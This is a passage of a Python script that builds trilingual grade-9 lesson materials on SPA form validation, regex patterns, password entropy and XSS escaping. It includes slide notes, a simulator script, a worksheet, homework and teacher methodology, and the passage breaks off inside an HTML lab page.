        ["Parol Entropiyasi", "Shennon formulasi: E = L * log2(R) orqali kiber-mustahkamlikni tushuntiring.", "RTX 4090 videokartasida parollarni buzish vaqtlarini solishtiring."],
        ["XSS Sanitizatsiya", "Foydalanuvchi kiritmasini to'g'ridan-to'g'ri innerHTML bilan chiqarish falokat ekanini ko'rsating.", "sanitizeHTML funksiyasini yozishni o'rgating."],
        ["Smartboard Sinovi", "Doskadagi simulyatorda email va parollarni kiritib ko'rsating.", "O'quvchini doskaga chiqarib <script> inyeksiyasini tozalab ko'rishni buyuring."],
        ["Tezkor Viktorina", "3 ta nazorat savoli orqali mavzuni mustahkamlang.", "To'g'ri javob berganlarga rag'bat ballari qo'ying."],
        ["Xulosa va Vazifa", "Darsni xulosalang va uy vazifasini belgilang.", "Keyingi NPM va paketlar xavfsizligi mavzusiga qiziqish uyg'oting."]
    ],
    "ru": [
        ["Введение и Цель", "Объявите тему: интерактивные формы, регулярные выражения Regex и кибер-валидация.", "Нарисуйте на доске сравнение POST refresh против SPA 0ms."],
        ["Разбор ДЗ 33", "Объясните ошибку 404 при нажатии F5 в SPA и отсутствие rewrites.", "Напомните про перенаправление всех путей на index.html."],
        ["Проблема Классических Форм", "Объясните, почему перезагрузка страниц ушла в прошлое.", "Покажите преимущества e.preventDefault() и события input."],
        ["Синтаксис Regex", "Разберите метасимволы регулярных выражений (^, $, \\d, \\w, +, {8,}).", "Продемонстрируйте работу метода RegExp.test()."],
        ["Боевые Шаблоны", "Разберите регулярки для email, номеров Узбекистана и паролей.", "Объясните логику positive lookahead."],
        ["Энтропия Пароля", "Объясните формулу Шеннона E = L * log2(R).", "Сравните скорость перебора паролей на современных GPU."],
        ["XSS Санитизация", "Покажите опасность прямого использования innerHTML.", "Научите экранировать спецсимволы в функции sanitizeHTML."],
        ["Смартборд Тест", "Запустите интерактивную проверку email и пароля на смартборде.", "Пригласите ученика протестировать нейтрализацию <script>."],
        ["Экспресс-Тест", "Проведите экспресс-опрос по 3 вопросам слайда.", "Начислите баллы за правильные ответы."],
        ["Итоги Урока", "Подведите итоги и выдайте домашнее задание.", "Анонсируйте тему NPM и безопасности зависимостей."]
    ],
    "en": [
        ["Intro & Objectives", "Announce today's topic: interactive forms, Regex syntax, and real-time cyber validation.", "Draw POST reload vs SPA 0ms latency on the board."],
        ["Lesson 33 Review", "Explain why hard F5 refreshes triggered 404 errors in naive SPAs without rewrites.", "Reinforce the golden rule of routing fallback to index.html."],
        ["Flaws of Classical Forms", "Explain how synchronous page refreshes break user experience.", "Highlight the benefits of e.preventDefault() and the input event."],
        ["Regex Syntax", "Break down essential metacharacters (^, $, \\d, \\w, +, {8,}).", "Demonstrate regex testing via RegExp.prototype.test()."],
        ["Production Regexes", "Walk through production patterns for email, +998 phone, and secure passwords.", "Explain positive lookahead validation logic."],
        ["Password Entropy", "Explain Shannon entropy formula E = L * log2(R).", "Compare brute-force resistance across modern GPU rigs."],
        ["XSS Sanitization", "Demonstrate the critical vulnerability of injecting user inputs via innerHTML.", "Guide students on crafting pure HTML escaping utilities."],
        ["Smartboard Demo", "Execute the live validation simulator on the smartboard.", "Invite a student to test malicious <script> neutralization."],
        ["Quick Quiz", "Conduct the 3-question knowledge check.", "Award participation points to active students."],
        ["Summary & Next", "Wrap up the lesson and assign the 3-tier homework.", "Tease the NPM package ecosystem and supply chain security for Lesson 35."]
    ]
}

# -----------------------------------------------------------------------------
# 3. INTERACTIVE SIMULATOR SCRIPT FOR PRESENTATION
# -----------------------------------------------------------------------------
SIMULATOR_JS = """
function testDemoEmail() {
  var inp = document.getElementById('demoEmail');
  var st = document.getElementById('demoEmailStatus');
  var regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
  if (!inp.value) {
    st.textContent = 'Email kiriting...';
    st.style.color = '#64748b';
  } else if (regex.test(inp.value)) {
    st.textContent = '✅ To‘g‘ri formatdagi email!';
    st.style.color = '#10b981';
  } else {
    st.textContent = '❌ Noto‘g‘ri email (@ va domen kerak)';
    st.style.color = '#ef4444';
  }
}

function testDemoPassword() {
  var inp = document.getElementById('demoPass');
  var val = inp.value;
  var bar = document.getElementById('demoEntropyBar');
  var st = document.getElementById('demoPassStatus');
  var out = document.getElementById('demoSanitizedOutput');

  // Compute character pool
  var pool = 0;
  if (/[a-z]/.test(val)) pool += 26;
  if (/[A-Z]/.test(val)) pool += 26;
  if (/\\d/.test(val)) pool += 10;
  if (/[^a-zA-Z0-9]/.test(val)) pool += 32;

  var entropy = 0;
  if (pool > 0 && val.length > 0) {
    entropy = Math.round(val.length * (Math.log(pool) / Math.log(2)));
  }

  // Update entropy UI
  var pct = Math.min(100, Math.round((entropy / 80) * 100));
  bar.style.width = pct + '%';

  if (entropy === 0) {
    bar.style.background = '#ef4444';
    st.textContent = 'Entropiya: 0 bit (Bo‘sh)';
    st.style.color = '#64748b';
  } else if (entropy < 40) {
    bar.style.background = '#ef4444';
    st.textContent = 'Entropiya: ' + entropy + ' bit (Juda zaif!)';
    st.style.color = '#ef4444';
  } else if (entropy < 60) {
    bar.style.background = '#eab308';
    st.textContent = 'Entropiya: ' + entropy + ' bit (O‘rtacha)';
    st.style.color = '#eab308';
  } else {
    bar.style.background = '#10b981';
    st.textContent = 'Entropiya: ' + entropy + ' bit (Kiber-Mustahkam ✅)';
    st.style.color = '#10b981';
  }

  // Live sanitization output
  var map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;', '/': '&#x2F;' };
  var sanitized = val.replace(/[&<>"'/]/g, function(s) { return map[s]; });
  out.textContent = sanitized || 'Tozalangan matn shu yerda chiqadi...';
}
"""

def build_presentation():
    with open(os.path.join(REPO_ROOT, "assets", "TEMPLATE_PREZENTATSIYA.html"), "r", encoding="utf-8") as f:
        tpl = f.read()

    title_uz = "34-dars: Formalar, Regex va Real-Vaqt Kiber-Validatsiya"
    title_ru = "Урок 34: Формы, Регулярные Выражения и Кибер-Валидация"
    title_en = "Lesson 34: Interactive Forms, Regex & Real-Time Cyber Validation"

    tpl = re.sub(r"<title[^>]*>.*?</title>",
                 f'<title data-ru="{title_ru}" data-en="{title_en}">{title_uz}</title>',
                 tpl)

    tpl = re.sub(r'<span class="tag"[^>]*>.*?</span>',
                 '<span class="tag" data-ru="9-КЛАСС" data-en="GRADE 9">9-SINF</span>',
                 tpl)

    titles_json = json.dumps({"uz": title_uz, "ru": title_ru, "en": title_en}, ensure_ascii=False, indent=2)
    tpl = re.sub(r'var TITLES\s*=\s*\{[\s\S]*?\};', lambda m: f'var TITLES = {titles_json};', tpl)

    notes_json = json.dumps(NOTES_DATA, ensure_ascii=False, indent=2)
    tpl = re.sub(r'var NOTES\s*=\s*\{[\s\S]*?\};', lambda m: f'var NOTES = {notes_json};', tpl)

    stage_regex = r'<div class="stage">[\s\S]*?</div><!-- /stage -->'
    new_stage = f'<div class="stage">\n{SLIDES_HTML}\n  </div><!-- /stage -->'
    tpl = re.sub(stage_regex, lambda m: new_stage, tpl)

    custom_script = f"<script>\n{SIMULATOR_JS}\n</script>\n</body>"
    tpl = tpl.replace("</body>", custom_script)

    out_path = os.path.join(DEST_DIR, "prezentatsiya.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: prezentatsiya.html")

def build_worksheet():
    with open(os.path.join(REPO_ROOT, "assets", "TEMPLATE_VARAQA.html"), "r", encoding="utf-8") as f:
        tpl = f.read()

    title_uz = "34-dars: Formalar, Regex va Real-Vaqt Kiber-Validatsiya"
    title_ru = "Урок 34: Формы, Регулярные Выражения и Кибер-Валидация"
    title_en = "Lesson 34: Interactive Forms, Regex & Real-Time Cyber Validation"

    tpl = re.sub(r"<title[^>]*>.*?</title>",
                 f'<title data-ru="{title_ru}" data-en="{title_en}">{title_uz}</title>',
                 tpl)

    tpl = re.sub(r'<h1>.*?</h1>',
                 f'<h1 data-ru="{title_ru}" data-en="{title_en}">{title_uz}</h1>',
                 tpl)

    sec1_html = """
    <p class="lead" style="font-size:12px; margin-bottom:8px;" data-ru="<strong>Миссия Урока:</strong> Запрограммировать интерактивную форму регистрации в SPA без перезагрузок страницы: на событии input проверять email и телефон Узбекистана по Regex, рассчитывать математическую энтропию пароля и нейтрализовать XSS-скрипты." data-en="<strong>Lesson Mission:</strong> Build an interactive single-page registration form with zero page reloads: validate email and Uzbek mobile phones in real-time via Regex, calculate password Shannon entropy, and sanitize XSS scripts."><strong>Dars Missiyasi:</strong> Sahifani qayta yuklamaydigan interaktiv ro'yxatdan o'tish formasini yaratish: input hodisasida email va +998 telefonini Regex bilan tekshirish, parol entropiyasini hisoblash va XSS xurujlarini zararsizlantirish.</p>
    <div style="background:var(--surface-2); padding:8px; border-radius:6px; font-size:11px; line-height:1.5;">
      <div style="font-weight:700; color:var(--accent); margin-bottom:4px;" data-ru="3 Правила Кибер-Гигиены Ввода:" data-en="3 Rules of Input Cyber Hygiene:">Kiber-Validatsiyaning 3 Oltin Qoidasi:</div>
      <div>1. <strong>Prevent Default:</strong> <span data-ru="Всегда перехватывать событие отправки submit, чтобы страница не перезагружалась." data-en="Always intercept submit events via preventDefault to avert page flushes.">Forma yuborilishini preventDefault bilan to'xtatib, SPA tezligini saqlash</span>.</div>
      <div>2. <strong>Strict Regex Bounds:</strong> <span data-ru="Использовать маркеры ^ и $ для предотвращения инъекций в середину строки." data-en="Enforce strict ^ and $ boundaries preventing payload evasion in string middles.">Qolip boshi (^) va oxiri ($) chegaralarini qo'yish orqali chetlab o'tishlarga yo'l qo'ymaslik</span>.</div>
      <div>3. <strong>Sanitize Untrusted Data:</strong> <span data-ru="Экранировать спецсимволы <, >, & перед выводом в DOM." data-en="Escape hazardous HTML characters before rendering into DOM trees.">Foydalanuvchi matnini DOM-ga chiqarishdan oldin maxsus belgilarni zararsizlantirish</span>.</div>
    </div>
    """

    sec2_html = """
    <p style="font-size:11px; margin-bottom:6px;" data-ru="Функция экранирования XSS-символов в JavaScript:" data-en="JavaScript XSS character entity escaping utility:">JavaScript-da XSS xavfli belgilarini zararsizlantiruvchi funksiya:</p>
    <pre style="background:var(--surface-2); padding:6px; font-size:11px; border-radius:4px; margin:0;"><code class="language-javascript">function sanitizeHTML(str) {
  const map = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#x27;', '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, s => map[s]);
}</code></pre>
    """

    sec3_html = """
    <div style="overflow-x:auto;">
      <table style="width:100%; border-collapse:collapse; font-size:11px; text-align:left;">
        <thead>
          <tr style="border-bottom:1px solid var(--hair); background:rgba(0,0,0,0.03);">
            <th style="padding:4px 6px;">#</th>
            <th style="padding:4px 6px;" data-ru="Поле Ввода" data-en="Input Field">Kiritish Maydoni</th>
            <th style="padding:4px 6px;" data-ru="Регулярное Выражение" data-en="Regex Pattern">Regex Qolipi</th>
            <th style="padding:4px 6px;" data-ru="Мин. Требование" data-en="Minimum Requirement">Minimal Talab</th>
            <th style="padding:4px 6px;" data-ru="Статус" data-en="Status">Holat</th>
          </tr>
        </thead>
        <tbody>
          <tr style="border-bottom:1px dashed var(--hair);">
            <td style="padding:4px 6px;">1</td>
            <td style="padding:4px 6px;">Email</td>
            <td style="padding:4px 6px;"><code>/^[^\\s@]+@[^\\s@]+\\.[a-z]{2,}$/</code></td>
            <td style="padding:4px 6px;" data-ru="Наличие @ и домена" data-en="@ and TLD suffix">@ belgisi va domen</td>
            <td style="padding:4px 6px; color:var(--green); font-weight:700;">✅ Bajarildi</td>
          </tr>
          <tr style="border-bottom:1px dashed var(--hair);">
            <td style="padding:4px 6px;">2</td>
            <td style="padding:4px 6px;">Telefon</td>
            <td style="padding:4px 6px;"><code>/^\+998(9\d|33|88)\d{7}$/</code></td>
            <td style="padding:4px 6px;" data-ru="+998 va 9 ta raqam" data-en="+998 & 9 digits">+998 va 9 ta raqam</td>
            <td style="padding:4px 6px; color:var(--green); font-weight:700;">✅ Bajarildi</td>
          </tr>
          <tr style="border-bottom:1px dashed var(--hair);">
            <td style="padding:4px 6px;">3</td>
            <td style="padding:4px 6px;">Parol</td>
            <td style="padding:4px 6px;"><code>/(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/</code></td>
            <td style="padding:4px 6px;" data-ru="Энтропия &gt; 60 бит" data-en="Entropy &gt; 60 bits">Entropiya &gt; 60 bit</td>
            <td style="padding:4px 6px; color:var(--green); font-weight:700;">✅ Bajarildi</td>
          </tr>
          <tr>
            <td style="padding:4px 6px;">4</td>
            <td style="padding:4px 6px;">Sanitize</td>
            <td style="padding:4px 6px;"><code>/[&lt;&gt;&amp;"']/g</code></td>
            <td style="padding:4px 6px;" data-ru="0% XSS уязвимостей" data-en="0% XSS vulnerabilities">0% XSS xavfi</td>
            <td style="padding:4px 6px; color:var(--green); font-weight:700;">✅ 100% Yashil</td>
          </tr>
        </tbody>
      </table>
    </div>
    """

    replacements = {
        "{{LESSON_NUM}}": "34",
        "{{LESSON_TITLE_UZ}}": "Formalar, Regex va Real-Vaqt Kiber-Validatsiya",
        "{{LESSON_TITLE_RU}}": "Формы, Регулярные Выражения и Кибер-Валидация",
        "{{LESSON_TITLE_EN}}": "Interactive Forms, Regex & Real-Time Cyber Validation",
        "{{COHORT_LABEL_UZ}}": "9-sinf",
        "{{COHORT_LABEL_RU}}": "9 класс",
        "{{COHORT_LABEL_EN}}": "Grade 9",
        "{{TRACK_NAME_UZ}}": "Junior Vibecoders, Full-Stack & DevOps Track",
        "{{TRACK_NAME_RU}}": "Junior Vibecoders, Full-Stack & DevOps",
        "{{TRACK_NAME_EN}}": "Junior Vibecoders, Full-Stack & DevOps Track",
        "{{SECTION_1_CONTENT}}": sec1_html,
        "{{SECTION_2_CONTENT}}": sec2_html,
        "{{SECTION_3_CONTENT}}": sec3_html,
        "{{RUBRIC_T1_BALL}}": "4",
        "{{RUBRIC_T1_UZ}}": "1-Daraja: Baza (Email va Telefon uchun to'g'ri Regex yozish)",
        "{{RUBRIC_T1_RU}}": "Уровень 1: База (Правильные Regex для email и телефона)",
        "{{RUBRIC_T1_EN}}": "Tier 1: Base (Accurate Regex for email and phone inputs)",
        "{{RUBRIC_T2_BALL}}": "4",
        "{{RUBRIC_T2_UZ}}": "2-Daraja: Amaliyot (Real-vaqt input hodisasi va entropiya shkalasi)",
        "{{RUBRIC_T2_RU}}": "Уровень 2: Практика (Событие input и шкала энтропии пароля)",
        "{{RUBRIC_T2_EN}}": "Tier 2: Practice (Real-time input listeners & entropy bar)",
        "{{RUBRIC_T3_BALL}}": "2",
        "{{RUBRIC_T3_UZ}}": "3-Daraja: Challenge (XSS belgilarni xatosiz tozalash moduli)",
        "{{RUBRIC_T3_RU}}": "Уровень 3: Челлендж (Модуль нейтрализации XSS спецсимволов)",
        "{{RUBRIC_T3_EN}}": "Tier 3: Challenge (XSS character entity escaping module)"
    }

    for k, v in replacements.items():
        tpl = tpl.replace(k, v)

    out_path = os.path.join(DEST_DIR, "varaqa.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: varaqa.html")

def build_homework():
    with open(os.path.join(REPO_ROOT, "assets", "TEMPLATE_VAZIFA.html"), "r", encoding="utf-8") as f:
        tpl = f.read()

    title_uz = "34-dars: Formalar, Regex va Real-Vaqt Kiber-Validatsiya"
    title_ru = "Урок 34: Формы, Регулярные Выражения и Кибер-Валидация"
    title_en = "Lesson 34: Interactive Forms, Regex & Real-Time Cyber Validation"

    tpl = re.sub(r"<title[^>]*>.*?</title>",
                 f'<title data-ru="{title_ru}" data-en="{title_en}">{title_uz}</title>',
                 tpl)

    tasks_html = """
    <!-- TIER 1 (4 BALL) -->
    <div class="task-card" style="margin-bottom:14px; border:1px solid var(--hair); border-radius:6px; padding:12px; background:var(--surface);">
      <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);">1-Daraja (Baza — 4 Ball)</div>
      <h3 style="margin:4px 0;" data-ru="Регулярные Выражения для Email и Телефона" data-en="Regex Patterns for Email & Phone">Email va Telefon Uchun Regex Qoliplari</h3>
      <p style="font-size:12px; color:var(--ink-2);" data-ru="Напишите две функции validate_email(email) и validate_uz_phone(phone), которые используют строгие регулярные выражения и возвращают true или false." data-en="Write two functions validate_email(email) and validate_uz_phone(phone) returning boolean values based on strict regex patterns.">Email va O'zbekiston raqamini (+998...) qat'iy tekshiruvchi ikkita JavaScript funksiyasini yozing.</p>
      <textarea id="hw_code_t1" class="code-editor" style="width:100%; min-height:90px; background:#0f172a; color:#f8fafc; font-family:monospace; font-size:11px; padding:8px; border-radius:4px; border:1px solid #334155;">// 1-Daraja yechimingizni shu yerga yozing
function validateEmail(email) {
  const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/;
  return regex.test(email);
}
</textarea>
    </div>

    <!-- TIER 2 (4 BALL) -->
    <div class="task-card" style="margin-bottom:14px; border:1px solid var(--hair); border-radius:6px; padding:12px; background:var(--surface);">
      <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);">2-Daraja (Amaliyot — 4 Ball)</div>
      <h3 style="margin:4px 0;" data-ru="Калькулятор Энтропии Пароля" data-en="Password Entropy Calculator">Parol Entropiyasi Kalkulyatori</h3>
      <p style="font-size:12px; color:var(--ink-2);" data-ru="Создайте функцию calculate_entropy(password), которая вычисляет пул символов R (маленькие, большие буквы, цифры, знаки), длину L и возвращает энтропию в битах: E = L * log2(R)." data-en="Create a function calculate_entropy(password) measuring character pool R, length L, and returning Shannon entropy in bits: E = L * log2(R).">Parolning belgilar to'plami (R) va uzunligini (L) aniqlab, Shennon formulasi bo'yicha entropiya bitlarini qaytaruvchi funksiya yozing.</p>
      <textarea id="hw_code_t2" class="code-editor" style="width:100%; min-height:100px; background:#0f172a; color:#f8fafc; font-family:monospace; font-size:11px; padding:8px; border-radius:4px; border:1px solid #334155;">// 2-Daraja yechimingizni shu yerga yozing
function calculateEntropy(password) {
  // Entropiya hisoblash kodi
}
</textarea>
    </div>

    <!-- TIER 3 (2 BALL) -->
    <div class="task-card" style="margin-bottom:14px; border:1px solid var(--hair); border-radius:6px; padding:12px; background:var(--surface);">
      <div class="tag" style="background:rgba(168,85,247,0.15); color:var(--purple);">3-Daraja (Kiber-Challenge — 2 Ball)</div>
      <h3 style="margin:4px 0;" data-ru="XSS Санитизатор и Безопасный Рендер" data-en="XSS Sanitizer & Safe DOM Renderer">XSS Sanitizator va Xavfsiz DOM Render</h3>
      <p style="font-size:12px; color:var(--ink-2);" data-ru="Реализуйте функцию sanitizeHTML(input), которая заменяет символы &lt;, &gt;, &amp;, &quot;, &#x27; и / на безопасные HTML entities, предотвращая выполнение скриптов при вставке в DOM." data-en="Implement sanitizeHTML(input) escaping &lt;, &gt;, &amp;, &quot;, &#x27; and / into safe entities, disallowing arbitrary script execution.">Kiritilgan xakerlik kodlarini xavfsiz matnga aylantiruvchi sanitizeHTML(input) funksiyasini yozing.</p>
      <textarea id="hw_code_t3" class="code-editor" style="width:100%; min-height:90px; background:#0f172a; color:#f8fafc; font-family:monospace; font-size:11px; padding:8px; border-radius:4px; border:1px solid #334155;">// 3-Daraja yechimingizni shu yerga yozing
function sanitizeHTML(str) {
  // XSS tozalash kodi
}
</textarea>
    </div>
    """

    replacements = {
        "{{LESSON_NUM}}": "34",
        "{{LESSON_TITLE_UZ}}": "Formalar, Regex va Real-Vaqt Kiber-Validatsiya",
        "{{LESSON_TITLE_RU}}": "Формы, Регулярные Выражения и Кибер-Валидация",
        "{{LESSON_TITLE_EN}}": "Interactive Forms, Regex & Real-Time Cyber Validation",
        "{{COHORT_LABEL_UZ}}": "9-sinf",
        "{{COHORT_LABEL_RU}}": "9 класс",
        "{{COHORT_LABEL_EN}}": "Grade 9",
        "{{RUBRIC_T1_BALL}}": "4",
        "{{RUBRIC_T1_UZ}}": "1-Daraja: Baza (Email va telefon uchun to'g'ri Regex)",
        "{{RUBRIC_T1_RU}}": "Уровень 1: База (Regex для email и телефона)",
        "{{RUBRIC_T1_EN}}": "Tier 1: Base (Regex for email and phone)",
        "{{RUBRIC_T2_BALL}}": "4",
        "{{RUBRIC_T2_UZ}}": "2-Daraja: Amaliyot (Parol entropiyasini hisoblash)",
        "{{RUBRIC_T2_RU}}": "Уровень 2: Практика (Расчет энтропии пароля)",
        "{{RUBRIC_T2_EN}}": "Tier 2: Practice (Password entropy calculator)",
        "{{RUBRIC_T3_BALL}}": "2",
        "{{RUBRIC_T3_UZ}}": "3-Daraja: Challenge (XSS belgilarni xatosiz tozalash)",
        "{{RUBRIC_T3_RU}}": "Уровень 3: Челлендж (Санитизация XSS символов)",
        "{{RUBRIC_T3_EN}}": "Tier 3: Challenge (XSS entity escaping)",
        "{{TASKS_HTML}}": tasks_html,
        "{{LESSON_SLUG}}": "9-w12-l34-formalar-regex-va-kiber-validatsiya"
    }

    for k, v in replacements.items():
        tpl = tpl.replace(k, v)

    out_path = os.path.join(DEST_DIR, "vazifa.html")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(tpl)
    print("  ✓ Created: vazifa.html")

def build_teacher_reading():
    doc = """# 34-dars: Formalar, Regex va Real-Vaqt Kiber-Validatsiya (O'qituvchi Metodologiyasi)

## Darsning Pasporti
- **Sinf:** 9-sinf (Junior Vibecoders, Full-Stack & DevOps Track)
- **Davomiyligi:** 40 daqiqa (Yakka Dars / Single Block)
- **Asosiy maqsad:** O'quvchilarga SPA ilovalarda klassik sahifani qayta yuklovchi POST formalardan voz kechib, `input` hodisasida 0 ms kechikish bilan ishlovchi real-vaqt kiber-validatsiyasini o'rgatish. Regex muntazam ifodalari sintaksisi, O'zbekiston telefon raqamlari qolipi, parol entropiyasini matematik hisoblash va XSS xurujlarini zararsizlantirish.

---

## 40 Daqiqalik Aniq Vaqt Taqsimoti (Pacing)

| Vaqt | Bosqich | Slayd | O'qituvchi Faoliyati | O'quvchilar Faoliyati |
|---|---|:---:|---|---|
| **00:00–04:00** | Kirish va Motivatsiya | 1 | Nega 2026-yilda yomon formalar mijozlarni yo'qotishi va kiber-xavfsizlik xavfini tushuntirish. | Diqqat bilan tinglaydilar va dars maqsadini belgilaydilar. |
| **04:00–08:00** | 33-dars HW Tahlili | 2 | SPA routerda F5 bosganda 404 xatosi chiqishi (Vercel rewrite yo'qligi) sababini tahlil qilish. | Blitz savolga javob beradilar, server rewrites qoidasini yozadilar. |
| **08:00–14:00** | Klassik Formalar Muammosi | 3 | Sahifa qayta yuklanishi o'rniga e.preventDefault() va input hodisasi ishlash tartibini ko'rsatish. | 0 ms validatsiya afzalligini anglaydilar. |
| **14:00–20:00** | Regex Sintaksisi | 4 | Meta-belgilar (^, $, \\d, \\w, +, {8,}) va RegExp.test() metodini doskaga yozish. | Sintaksisni daftarlariga qayd etadilar. |
| **20:00–25:00** | Amaliy Qoliplar | 5 | Email, O'zbekiston telefoni (+998) va kuchli parol qoliplarini tahlil qilish. | Qoliplar tuzilishini o'rganadilar. |
| **25:00–29:00** | Parol Entropiyasi | 6 | E = L * log2(R) formulasi va RTX 4090 da brute-force vaqtlari taqqoslashini ko'rsatish. | Parol uzunligi nega muhimligini tushunadilar. |
| **29:00–33:00** | XSS Sanitizatsiya | 7 | innerHTML orqali script va img onerror inyeksiyasi qanday sodir bo'lishini ko'rsatish. | sanitizeHTML funksiyasini yozishni o'rganadilar. |
| **33:00–37:00** | Smartboard Sinovi | 8 | Slayddagi simulyatorda email va parollarni sinash, xakerlik kodini tozalashni ko'rsatish. | Ekranda real-vaqt validatsiyani kuzatadilar. |
| **37:00–39:00** | Viktorina (Quiz) | 9 | 3 ta nazorat savoli bo'yicha tezkor blitz o'tkazish. | Faol javob beradilar va bilimlarini mustahkamlaydilar. |
| **39:00–40:00** | Xulosa va Uy Vazifasi | 10 | 10 ballik uy vazifasini tushuntirish va NPM mavzusiga ko'prik! | Kundaliklariga vazifani yozib oladilar. |

---

## O'qituvchi Uchun Muhim Blitz Savollari
1. **"Nega `change` hodisasi o'rniga `input` hodisasidan foydalanish afzalroq?"**
   - Javob: Chunki `change` faqat foydalanuvchi maydondan fokusni uzgandagina (blur) ishlaydi. `input` esa har bitta harf yozilganda 0 ms da javob qaytaradi.
2. **"Nega parolda belgilar xilma-xilligi (R) emas, ko'proq uzunlik (L) entropiyani tezroq oshiradi?"**
   - Javob: Chunki formula bo'yicha uzunlik $L$ ko'paytuvchi sifatida turadi, $R$ esa logarifm ichida. Uzunlikning 1 taga oshishi ehtimolliklar fazosini bir necha karra ko'paytiradi.

---

## 10 Ballik Baholash Rubrikasi
- **4 Ball (Baza):** Email va +998 telefon raqamlari uchun to'g'ri Regex yozadi va test() metodidan foydalanadi.
- **4 Ball (Amaliy):** `input` hodisasida parol entropiyasini hisoblab, rangli shkalada ko'rsata oladi.
- **2 Ball (Challenge):** XSS xavfli belgilarini (&lt;, &gt;, &amp;, &quot;) maxsus HTML obyektlariga aylantiruvchi tozalash modulini yaratadi!
"""
    out_path = os.path.join(DEST_DIR, "TEACHER_READING.md")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(doc)
    print("  ✓ Created: TEACHER_READING.md")

def build_studio():
    html = """<!DOCTYPE html>
<html lang="uz">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title data-ru="CyberForm & Regex Studio: Интерактивная Валидация" data-en="CyberForm & Regex Studio: Interactive Validation">CyberForm & Regex Studiyasi: Interaktiv Kiber-Validatsiya</title>
<link rel="stylesheet" href="../../../../assets/brand.css">
<style>
:root {
  --bg-dark: #090d16;
  --surface-panel: #111827;
  --surface-border: #1f2937;
  --accent-blue: #3b82f6;
  --accent-green: #10b981;
  --accent-purple: #a855f7;
  --accent-red: #ef4444;
}
body {
  margin: 0;
  padding: 0;
  background: var(--bg-dark);
  color: #f8fafc;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
  height: 100vh;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}
header {
  background: var(--surface-panel);
  border-bottom: 1px solid var(--surface-border);
  padding: 10px 20px;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.brand-title {
  font-weight: 700;
  font-size: 14px;
  display: flex;
  align-items: center;
  gap: 8px;
}
.badge-tech {
  background: rgba(59,130,246,0.15);
  color: var(--accent-blue);
  padding: 2px 8px;
  border-radius: 4px;
  font-size: 11px;
  font-family: monospace;
}
.main-grid {
  flex: 1;
  display: grid;
  grid-template-columns: 1.1fr 0.9fr;
  gap: 12px;
  padding: 12px;
  overflow: hidden;
}
.panel {
  background: var(--surface-panel);
  border: 1px solid var(--surface-border);
  border-radius: 8px;
  display: flex;
  flex-direction: column;
  overflow: hidden;
}
.panel-header {
  background: rgba(0,0,0,0.25);
  border-bottom: 1px solid var(--surface-border);
  padding: 8px 14px;
  font-size: 11px;
  font-weight: 700;
  display: flex;
  justify-content: space-between;
  align-items: center;
}
.form-container {
  flex: 1;
  padding: 16px;
  overflow-y: auto;
  display: flex;
  flex-direction: column;
  gap: 12px;
}
.input-group {
  display: flex;
  flex-direction: column;
  gap: 4px;
}
.input-label {
  font-size: 11px;
  font-weight: 700;
  color: #94a3b8;
}
.input-field {
  background: #0f172a;
  border: 1px solid #334155;
  color: #fff;
  padding: 8px 12px;
  border-radius: 6px;
  font-size: 12px;
  outline: none;
  transition: all 0.2s;
}
.input-field:focus {
  border-color: var(--accent-blue);
  box-shadow: 0 0 8px rgba(59,130,246,0.25);
}
.input-field.valid {
  border-color: var(--accent-green);
  box-shadow: 0 0 8px rgba(16,185,129,0.2);
}
.input-field.invalid {
  border-color: var(--accent-red);
  box-shadow: 0 0 8px rgba(239,68,68,0.2);
}
.feedback-text {
  font-size: 10px;
  font-weight: 700;
  min-height: 14px;
}
.entropy-bar-track {
  height: 6px;
  background: #1e293b;
  border-radius: 3px;
  overflow: hidden;
  margin-top: 4px;
}
.entropy-bar-fill {
  height: 100%;
  width: 0%;
  transition: width 0.25s, background 0.25s;
}
.console-body {
  flex: 1;
  background: #050811;
  padding: 12px;
  font-family: monospace;
  font-size: 11px;
  overflow-y: auto;
  line-height: 1.5;
}
.btn {
  background: var(--accent-blue);
  color: #fff;
  border: none;
  padding: 8px 16px;
  border-radius: 6px;
  font-weight: 700;
  font-size: 12px;
  cursor: pointer;
}
.btn:hover { opacity: 0.9; }
</style>
</head>
<body>

<header>
  <div class="brand-title">
    <span>Target International School</span>
    <span class="badge-tech">CYBER-FORM v3.4</span>
    <span data-ru="Лаборатория Регулярных Выражений" data-en="Regex & Form Lab">Regex va Kiber-Forma Studiyasi</span>
  </div>
  <div style="font-size:11px; color:#94a3b8; font-family:monospace;">
    <span data-ru="Режим:" data-en="Mode:">Rejim:</span> <strong style="color:var(--accent-green);">Client-Side Live Validation</strong>
  </div>
  <div>
    <button class="btn" onclick="resetForm()" data-ru="Сбросить Форму" data-en="Reset Form">Qayta o'rnatish</button>
  </div>
</header>

<div class="main-grid">
  <!-- LEFT: LIVE FORM INTERACTION -->
  <div class="panel">
    <div class="panel-header">
      <span data-ru="ФОРМА РЕГИСТРАЦИИ (SPA 0 MS VALIDATION)" data-en="REGISTRATION FORM (SPA 0 MS VALIDATION)">RO'YXATDAN O'TISH FORMASI (0 MS VALIDATSIYA)</span>
      <span style="color:var(--accent-green); font-size:10px;">Event: oninput</span>
    </div>
    <div class="form-container">
      <!-- 1. FULL NAME WITH XSS TEST -->
      <div class="input-group">
        <label class="input-label" data-ru="Имя и Фамилия (Тест на XSS-инъекцию):" data-en="Full Name (XSS Injection Test):">To'liq Ism (XSS Inyeksiya Sinovi):</label>
